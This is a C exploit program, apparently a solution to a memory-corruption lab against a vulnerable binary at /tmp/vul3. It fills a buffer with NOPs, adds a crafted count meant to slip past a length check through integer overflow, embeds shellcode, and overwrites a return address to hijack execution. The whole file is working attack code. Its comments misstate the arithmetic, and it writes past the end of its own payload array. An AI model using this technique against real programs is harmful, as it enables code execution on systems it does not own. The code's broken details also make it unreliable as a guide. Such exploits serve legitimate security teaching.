#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul3"

int main(void)
{
    char payload[1000 * (8 + 8 + 4) + 4 + 11];          // 定义大小为 sw * MAX_WIDGETS + len(number) +len(addr)的payload
    int i;

    for (i = 0; i < sizeof(payload); i++) {
		payload[i] = '\x90';				// 填充nop
	}

    char *number = "2147484649,";                       // number大小为 2^32 + 1001
    memcpy(payload, number, strlen(number));            // 填充count,令其可躲过if判断
    memcpy(payload + 1024, shellcode, strlen(shellcode));   // 在1024处填充shellcode
    payload[20000 + strlen(number) + 4] = '\xf0';           // 填充buf地址
    payload[20000 + strlen(number) + 5] = '\x61';
    payload[20000 + strlen(number) + 6] = '\xff';
    payload[20000 + strlen(number) + 7] = '\xbf';


    char *args[] = { TARGET, payload, NULL };
    char *env[] = { NULL };

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
